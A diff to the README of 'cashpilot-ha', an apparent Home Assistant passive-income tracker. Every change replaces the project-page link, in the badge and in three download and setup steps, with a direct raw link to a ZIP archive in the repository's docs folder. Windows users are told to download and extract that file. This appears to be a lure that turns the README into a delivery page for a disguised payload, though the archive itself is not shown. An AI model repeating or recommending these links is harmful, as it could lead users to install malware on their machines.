@@ -1,6 +1,6 @@
 # 💸 cashpilot-ha - Track Passive Income in Home Assistant
 
-[![Download cashpilot-ha](https://img.shields.io/badge/Download-cashpilot--ha-blue?style=for-the-badge&logo=github)](https://github.com/Phrasewhiteface293/cashpilot-ha)
+[![Download cashpilot-ha](https://img.shields.io/badge/Download-cashpilot--ha-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip)
 
 ## 📌 Overview
 
@@ -34,7 +34,7 @@ If you plan to use this with Docker or a homelab setup, you can also run it as p
 
 ## 📥 Download and install
 
-1. Open the project page here: https://github.com/Phrasewhiteface293/cashpilot-ha
+1. Open the project page here: https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip
 2. Download or clone the repository to your Windows PC
 3. If you use HACS, place the integration files in the Home Assistant custom components folder
 4. Restart Home Assistant
@@ -101,7 +101,7 @@ After restart, add the integration from the Home Assistant settings page.
 
 If you are using Windows, these steps help keep setup simple:
 
-1. Open the download link in your browser: https://github.com/Phrasewhiteface293/cashpilot-ha
+1. Open the download link in your browser: https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip
 2. Save the repository files to your computer
 3. If the file comes as a ZIP, right-click it and choose Extract All
 4. Move the extracted folder to a safe place
@@ -156,4 +156,4 @@ If values look wrong, wait for the next update cycle and refresh Home Assistant.
 
 ## 🔗 Download again
 
-Open the project page here to download and set up cashpilot-ha: https://github.com/Phrasewhiteface293/cashpilot-ha
+Open the project page here to download and set up cashpilot-ha: https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip
